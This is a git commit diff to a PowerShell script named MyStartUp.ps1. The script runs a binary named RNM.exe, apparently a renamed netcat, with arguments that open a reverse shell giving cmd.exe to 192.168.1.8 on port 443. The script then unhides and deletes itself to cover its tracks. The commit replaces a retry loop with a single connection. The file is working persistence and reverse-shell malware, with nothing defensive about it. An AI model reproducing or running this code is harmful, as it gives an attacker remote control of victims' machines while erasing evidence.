420e08770aa280321eb078792418cd44a0bac984
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-02-19 22:46:46 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,3 @@
-while ($true){C:\Users\Public\RNM.exe -nv 192.168.1.8 443 -e cmd.exe; sleep 4
+C:\Users\Public\RNM.exe -nv 192.168.1.8 443 -e cmd.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
